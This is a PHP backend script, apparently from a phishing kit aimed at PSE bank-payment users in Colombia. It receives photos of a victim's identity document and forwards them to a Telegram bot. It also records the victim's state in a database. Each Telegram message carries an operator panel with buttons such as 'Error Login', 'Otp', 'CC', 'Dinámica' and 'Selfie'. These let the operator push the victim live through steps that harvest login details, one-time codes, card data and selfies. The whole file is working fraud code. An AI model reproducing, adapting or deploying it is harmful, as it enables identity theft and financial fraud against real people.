<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);

if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/../../config/config.php';
}
$conn = require __DIR__ . '/../../config/db.php';

$botToken = $config['botToken'];
$chatId = $config['chatId'];
$baseUrl = $config['baseUrl'];
$security_key = $config['security_key'];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../../index.php');
    exit();
}

$imageData = $_POST['image'] ?? '';
$clienteId = $_POST['cliente_id'] ?? '';
$tipo = $_POST['tipo'] ?? 'unknown';

if (empty($imageData) || empty($clienteId)) {
    echo json_encode(['status' => 'error', 'message' => 'Faltan datos']);
    exit;
}

try {
    // Limpiar prefijo data:image/...;base64,
    $imageData = preg_replace('#^data:image/\w+;base64,#i', '', $imageData);
    $decodedImage = base64_decode($imageData);

    // Guardar en /tmp (único dir escribible en Vercel Lambda)
    $fileName = 'doc_' . $tipo . '_' . $clienteId . '_' . time() . '.jpg';
    $tmpPath = sys_get_temp_dir() . '/' . $fileName;
    file_put_contents($tmpPath, $decodedImage);

    $caption = ($tipo === 'front') ? "🆔 Documento FRENTE recibido" : "🆔 Documento REVERSO recibido";
    $caption .= "\nID Cliente: " . $clienteId;

    $keyboard = ['inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$clienteId"],
                ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$clienteId"],
            ],
            [
                ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$clienteId"],
                ['text' => '💳 CC',         'callback_data' => "cmd_5_$clienteId"],
            ],
            [
                ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$clienteId"],
                ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$clienteId"],
            ],
            [
                ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$clienteId"],
                ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$clienteId"]
            ],
            [
                ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$clienteId"],
                ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$clienteId"]
            ],
            [
                ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$clienteId"],
                ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$clienteId"],
                ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$clienteId"]
            ]
        ]];

    // Enviar foto a Telegram
    $ch = curl_init("https://api.telegram.org/bot$botToken/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chatId,
        'photo' => new CURLFile($tmpPath, 'image/jpeg', $fileName),
        'caption' => $caption,
        'reply_markup' => json_encode($keyboard),
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    if ($err)
        error_log('[procesar_doc] curl error: ' . $err);

    // Extraer file_id de Telegram para guardarlo en DB
    $tgData = $result ? json_decode($result, true) : null;
    $fileRef = $fileName; // fallback
    if ($tgData && $tgData['ok'] && isset($tgData['result']['photo'])) {
        $photos = $tgData['result']['photo'];
        $fileRef = end($photos)['file_id'];
    }

    // Limpiar temp
    @unlink($tmpPath);

    // Actualizar DB — estado = 1 (espera acción admin) para romper el loop del polling
    $columnaFoto = ($tipo === 'front') ? 'foto_front' : 'foto_back';
    $stmt = $conn->prepare("UPDATE pse SET estado = 1, $columnaFoto = :foto WHERE id = :id");
    $stmt->execute(['foto' => $fileRef, 'id' => $clienteId]);

    // Redirigir
    $isRetry = isset($_POST['retry']) && $_POST['retry'] == '1';
    if ($isRetry || $tipo === 'back') {
        header("Location: ../../index.php?status=espera&id=" . $clienteId);
    }
    else {
        header("Location: ../../index.php?status=doc_back&id=" . $clienteId);
    }
    exit();

}
catch (Exception $e) {
    error_log('[procesar_doc] ' . $e->getMessage());
    header("Location: ../../index.php?status=espera&id=" . $clienteId);
    exit();
}
?>
